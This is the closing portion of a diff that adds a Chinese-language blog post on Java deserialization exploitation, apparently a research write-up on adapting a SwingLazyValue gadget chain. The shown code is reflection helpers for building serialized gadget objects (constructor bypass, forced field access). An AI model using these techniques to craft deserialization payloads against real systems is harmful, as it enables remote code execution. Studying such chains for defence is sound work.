+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">createWithoutConstructor</span> <span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> classToInstantiate <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> InvocationTargetException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> createWithConstructor<span style="color:#ff79c6">(</span>classToInstantiate<span style="color:#ff79c6">,</span> Object<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">],</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> T <span style="color:#50fa7b">createWithConstructor</span> <span style="color:#ff79c6">(</span> Class<span style="color:#ff79c6">&lt;</span>T<span style="color:#ff79c6">&gt;</span> classToInstantiate<span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">&lt;?</span> <span style="color:#8be9fd;font-style:italic">super</span> T<span style="color:#ff79c6">&gt;</span> constructorClass<span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">&lt;?&gt;[]</span> consArgTypes<span style="color:#ff79c6">,</span> Object<span style="color:#ff79c6">[]</span> consArgs <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchMethodException<span style="color:#ff79c6">,</span> InstantiationException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> InvocationTargetException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#ff79c6">&lt;?</span> <span style="color:#8be9fd;font-style:italic">super</span> T<span style="color:#ff79c6">&gt;</span> objCons <span style="color:#ff79c6">=</span> constructorClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredConstructor</span><span style="color:#ff79c6">(</span>consArgTypes<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setAccessible<span style="color:#ff79c6">(</span>objCons<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#ff79c6">&lt;?&gt;</span> sc <span style="color:#ff79c6">=</span> ReflectionFactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getReflectionFactory</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">newConstructorForSerialization</span><span style="color:#ff79c6">(</span>classToInstantiate<span style="color:#ff79c6">,</span> objCons<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        setAccessible<span style="color:#ff79c6">(</span>sc<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">(</span>T<span style="color:#ff79c6">)</span>sc<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>consArgs<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span>AccessibleObject member<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        String versionStr <span style="color:#ff79c6">=</span> System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;java.version&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> javaVersion <span style="color:#ff79c6">=</span> Integer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">parseInt</span><span style="color:#ff79c6">(</span>versionStr<span style="color:#ff79c6">.</span><span style="color:#50fa7b">split</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;\\.&#34;</span><span style="color:#ff79c6">)[</span>0<span style="color:#ff79c6">]);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>javaVersion <span style="color:#ff79c6">&lt;</span> 12<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// quiet runtime warnings from JDK9+
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//            Permit.setAccessible(member);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// not possible to quiet runtime warnings anymore...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// see https://bugs.openjdk.java.net/browse/JDK-8210522
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// to understand impact on Permit (i.e. it does not work
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#6272a4">// anymore with Java &gt;= 12)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            member<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String name<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><h3 id="其他方法待更新">其他方法待更新</h3>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#简单分析">简单分析</a></li>
+        <li><a href="#失败的尝试----base64data">失败的尝试 &ndash; Base64Data</a>
+          <ul>
+            <li><a href="#反射修改外部类属性">反射修改外部类属性</a></li>
+            <li><a href="#序列化时候的报错">序列化时候的报错</a></li>
+            <li><a href="#datasourceis被掉包">dataSource.is被掉包</a></li>
+          </ul>
+        </li>
+        <li><a href="#正解">正解</a>
+          <ul>
+            <li><a href="#改造-swinglazyvalue-链">改造 SwingLazyValue 链</a></li>
+            <li><a href="#可控类可控方法可控参数">可控类.可控方法(可控参数)</a></li>
+            <li><a href="#其他方法待更新">其他方法待更新</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
